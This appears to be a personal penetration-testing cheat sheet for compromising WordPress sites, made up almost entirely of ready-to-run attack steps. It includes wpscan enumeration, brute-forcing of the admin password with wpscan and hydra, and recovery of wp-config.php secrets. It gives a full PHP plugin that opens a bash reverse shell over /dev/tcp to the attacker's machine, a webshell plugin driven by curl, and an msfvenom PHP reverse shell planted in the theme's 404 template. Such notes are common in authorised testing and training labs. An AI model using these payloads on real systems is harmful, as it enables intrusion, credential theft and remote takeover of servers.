#### WPScan
```bash - kali
wpscan -e ap,at,tt,cb,dbe,u,m --detection-mode aggressive --plugins-detection aggressive -t 30 --url http://$TARGET
```

#### Password Cracking
```bash - kali
wpscan --url http://$TARGET -U admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

#### wp-config.php.swp file
```bash - kali
vim -r .wp-config.php.swp
```

```bash - kali
esc
```

```bash - kali
:w wp-config.txt
```

Now viewing the contents are much easier in wp-config.txt file.

#### WORDPRESS PLUGIN SHELL

[https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell](https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell)

```bash - kali
mousepad reverseshell-plugin.php
```

```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: [http://www.sevenlayers.com](http://www.sevenlayers.com)
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");

?>
```

```bash - kali
zip reverseshell-plugin.zip ./reverseshell-plugin.php
```

![[rlwrap]]

Plugins > Add new > Upload > Install now
* If this fails, try doing [[Wordpress#Webshell method]]

Now just click on "Activate Plugin" and done!

#### Webshell method
```
cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
```

```
sudo zip plugin-shell.zip plugin-shell.php
```

WordPress > Plugins > add New > Upload > Browse > plugin-shell.zip > Install now

Even if this says it failed to install, STILL RUN THE CURL COMMAND!
![[Pasted image 20220601122227.png]]

```
curl http://$TARGET/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
```

#### php template shell
```bash - kali
msfvenom -p php/reverse_php lhost=$KALI lport=443 -f raw
```

In WordPress, go to Appearance > Theme Editor, choose a page to edit, here we try the 404 page.

After updating, just access a non-existing page to trigger reverse shell.

#### Finding usernames & passwords:
```bash - kali
cd /var/www/html/wordpress
```

```bash
cat wp-config.php | grep DB
```

#### hydra command against wordpress:

![[Hydra#Hydra against WordPress]]

FROM BURP:
>log=webdeveloper&pwd=root&wp-submit=Log+In&redirect_to=http%3A%2F%2F$TARGET%2Fwp-admin%2F&testcookie=1

```bash - kali
hydra -l webdeveloper -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt $TARGET -s 80 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -f
```

![[Port 3306 - MySQL ~#MySQL to Wordpress password]]

[[3._LFI RFI#Wordpress config php]]